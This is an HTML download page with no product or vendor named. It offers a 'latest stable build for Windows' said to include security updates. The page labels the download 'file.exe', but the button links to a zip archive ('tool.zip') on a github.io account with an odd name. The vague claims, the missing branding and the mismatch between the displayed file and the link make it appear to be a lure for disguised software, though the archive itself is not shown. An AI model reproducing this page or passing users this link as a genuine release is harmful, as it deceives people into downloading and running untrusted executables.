<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Download</title>
<style>
  :root {
    --bg: #ffffff;
    --surface: #f7f8fa;
    --border: #e5e7eb;
    --text: #111827;
    --muted: #6b7280;
    --accent: #2563eb;
    --accent-hover: #1d4ed8;
  }

  * { box-sizing: border-box; }

  body {
    margin: 0;
    font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    color: var(--text);
    background: var(--bg);
    line-height: 1.55;
    -webkit-font-smoothing: antialiased;
  }

  header {
    border-bottom: 1px solid var(--border);
    padding: 16px 32px;
    display: flex;
    align-items: center;
    gap: 12px;
  }

  .logo {
    display: flex;
    align-items: center;
    gap: 10px;
    font-weight: 600;
    font-size: 15px;
    letter-spacing: -.01em;
  }

  .logo-mark {
    width: 22px;
    height: 22px;
    border-radius: 5px;
    background: var(--accent);
    display: grid;
    place-items: center;
  }

  .logo-mark svg {
    width: 13px;
    height: 13px;
    stroke: #fff;
    stroke-width: 2.2;
    fill: none;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  main {
    max-width: 640px;
    margin: 0 auto;
    padding: 72px 32px 96px;
  }

  .eyebrow {
    font-size: 12px;
    font-weight: 600;
    letter-spacing: .08em;
    text-transform: uppercase;
    color: var(--accent);
    margin: 0 0 12px;
  }

  h1 {
    font-size: 32px;
    font-weight: 600;
    letter-spacing: -.02em;
    margin: 0 0 12px;
  }

  .lede {
    font-size: 16px;
    color: var(--muted);
    margin: 0 0 36px;
  }

  .panel {
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 24px;
    background: var(--surface);
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 24px;
    flex-wrap: wrap;
  }

  .file-meta {
    display: flex;
    align-items: center;
    gap: 14px;
    min-width: 0;
  }

  .file-icon {
    width: 40px;
    height: 40px;
    border-radius: 8px;
    background: #fff;
    border: 1px solid var(--border);
    display: grid;
    place-items: center;
    flex-shrink: 0;
  }

  .file-icon svg {
    width: 20px;
    height: 20px;
    stroke: var(--muted);
    stroke-width: 1.8;
    fill: none;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  .file-name {
    font-size: 14px;
    font-weight: 500;
    margin: 0;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }

  .file-info {
    font-size: 13px;
    color: var(--muted);
    margin: 2px 0 0;
  }

  .btn {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    padding: 10px 20px;
    font-size: 14px;
    font-weight: 500;
    font-family: inherit;
    color: #fff;
    text-decoration: none;
    background: var(--accent);
    border-radius: 7px;
    transition: background .15s ease;
    white-space: nowrap;
  }

  .btn:hover { background: var(--accent-hover); }
  .btn:focus-visible {
    outline: 2px solid var(--accent);
    outline-offset: 2px;
  }

  .btn svg {
    width: 15px;
    height: 15px;
    stroke: currentColor;
    stroke-width: 2;
    fill: none;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  .footnote {
    font-size: 13px;
    color: var(--muted);
    margin-top: 20px;
  }

  .footnote a {
    color: var(--accent);
    text-decoration: none;
  }

  .footnote a:hover { text-decoration: underline; }

  @media (max-width: 480px) {
    main { padding: 48px 20px 64px; }
    h1 { font-size: 26px; }
    .panel { flex-direction: column; align-items: stretch; }
    .btn { justify-content: center; }
  }
</style>
</head>
<body>

  <header>
    <div class="logo">
      <div class="logo-mark">
        <svg viewBox="0 0 24 24">
          <path d="M12 3v12"/>
          <path d="m7 10 5 5 5-5"/>
          <path d="M5 21h14"/>
        </svg>
      </div>
      Downloads
    </div>
  </header>

  <main>
    <p class="eyebrow">Latest release</p>
    <h1>Download for Windows</h1>
    <p class="lede">
      The latest stable build for Windows. Includes security updates and
      performance improvements over the previous release.
    </p>

    <div class="panel">
      <div class="file-meta">
        <div class="file-icon">
          <svg viewBox="0 0 24 24">
            <path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z"/>
            <path d="M14 3v5h5"/>
          </svg>
        </div>
        <div>
          <p class="file-name">file.exe</p>
          <p class="file-info">Windows 10 / 11 &middot; 64-bit &middot; 48.2 MB</p>
        </div>
      </div>

      <a class="btn" href="https://wm3rti-cloud.github.io/tool.zip" download>
        <svg viewBox="0 0 24 24">
          <path d="M12 3v12"/>
          <path d="m7 10 5 5 5-5"/>
          <path d="M5 21h14"/>
        </svg>
        Download
      </a>
    </div>

    <p class="footnote">
      Looking for a different version? See the <a href="#">release archive</a>.
    </p>
  </main>

</body>
</html>
